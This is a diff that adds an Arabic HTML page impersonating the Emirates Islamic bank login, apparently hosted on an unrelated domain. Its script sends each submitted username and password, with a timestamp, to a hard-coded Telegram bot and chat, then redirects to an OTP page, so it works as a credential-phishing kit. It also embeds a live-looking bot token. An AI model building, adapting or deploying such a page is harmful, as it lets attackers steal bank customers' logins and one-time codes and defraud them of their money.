@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الإمارات الإسلامي - تسجيل الدخول</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="الإمارات الإسلامي - تسجيل الدخول">
+    <meta property="og:description" content="قم بتسجيل الدخول إلى حسابك باستخدام اسم المستخدم وكلمة المرور.">
+    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/emirates_islamic_bank_logo.png">
+    <meta property="og:url" content="https://alkhaleeg.services/sadu/emirates_islamic_login.html">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            background: #f5f5f5;
+            padding: 20px;
+            line-height: 1.6;
+            margin: 0;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                font-size: 14px;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .btn-purple {
+                width: 90%;
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .form-container {
+                padding: 15px;
+            }
+            .btn-purple {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px;
+            }
+        }
+
+        .menu-icon {
+            text-align: center;
+            font-size: 30px;
+            color: #333;
+            margin: 20px 0;
+        }
+        h1 {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 30px;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #6a4c93;
+            outline: none;
+        }
+        .input-with-eye {
+            position: relative;
+        }
+        .input-with-eye img {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 20px;
+            cursor: pointer;
+            opacity: 0.5;
+        }
+        .input-with-eye img:hover {
+            opacity: 1;
+        }
+        .btn-purple {
+            display: block;
+            width: 100%;
+            margin: 25px auto;
+            padding: 12px;
+            background: #6a4c93;
+            color: white;
+            text-align: center;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-purple:hover {
+            background: #5a3e7d;
+        }
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="menu-icon">≡</div>
+
+<h1>قم بتسجيل الدخول إلى حسابك</h1>
+
+<div class="form-container">
+    <form id="emiratesLogin">
+        <label for="username">اسم المستخدم/البريد الإلكتروني</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">كلمة المرور</label>
+        <div class="input-with-eye">
+            <input type="password" id="password" name="password" required>
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDIwIDIwIj48cGF0aCBkPSJNMjAgMTBjLTcuMTkgMC0xMyA1LjgxLTEzIDEzdiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzIgMjNDMjQuODIgMjMgMjAgMjcuODIgMjAgMzV2MTBjMCAzLjMzIDIuNjcgNiA2IDZoMTJjMy4zMyAwIDYtMi42NyA2LTYVjEwYzAtMy4zMy0yLjY3LTYtNi02SDMyWiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48L3N2Zz4=" alt="أيقونة عين" id="togglePassword">
+        </div>
+
+        <button type="submit" class="btn-purple">تسجيل الدخول</button>
+        <div class="error-message" id="errorMessage"></div>
+    </form>
+</div>
+
+<script>
+    document.getElementById('emiratesLogin').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // إخفاء رسالة الخطأ
+        document.getElementById('errorMessage').style.display = 'none';
+
+        // بوت تلغرام
+        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const chatId = '1008144314';
+
+        const message = `
+🔐 *تسجيل دخول الإمارات الإسلامي*
+
+👤 اسم المستخدم: ${username}
+🔑 كلمة المرور: ${password}
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+`;
+
+        // إرسال البيانات إلى تلغرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // بعد النجاح: التوجيه إلى صفحة OTP
+                window.location.href = 'otp_page.html';
+            } else {
+                throw new Error('فشل الإرسال');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
+            errorMsg.style.display = 'block';
+        });
+    });
+
+    // تبديل عرض/إخفاء كلمة المرور
+    document.getElementById('togglePassword').addEventListener('click', function() {
+        const passwordInput = document.getElementById('password');
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDIwIDIwIj48cGF0aCBkPSJNMjAgMTBjLTcuMTkgMC0xMyA1LjgxLTEzIDEzdiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzIgMjNDMjQuODIgMjMgMjAgMjcuODIgMjAgMzV2MTBjMCAzLjMzIDIuNjcgNiA2IDZoMTJjMy4zMyAwIDYtMi42NyA2LTYVjEwYzAtMy4zMy0yLjY3LTYtNi02SDMyWiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48L3N2Zz4=';
+        } else {
+            passwordInput.type = 'password';
+            this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDIwIDIwIj48cGF0aCBkPSJNMjAgMTBjLTcuMTkgMC0xMyA1LjgxLTEzIDEzdiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzIgMjNDMjQuODIgMjMgMjAgMjcuODIgMjAgMzV2MTBjMCAzLjMzIDIuNjcgNiA2IDZoMTJjMy4zMyAwIDYtMi42NyA2LTYVjEwYzAtMy4zMy0yLjY3LTYtNi02SDMyWiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48L3N2Zz4=';
+        }
+    });
+</script>
+
+</body>
+</html>
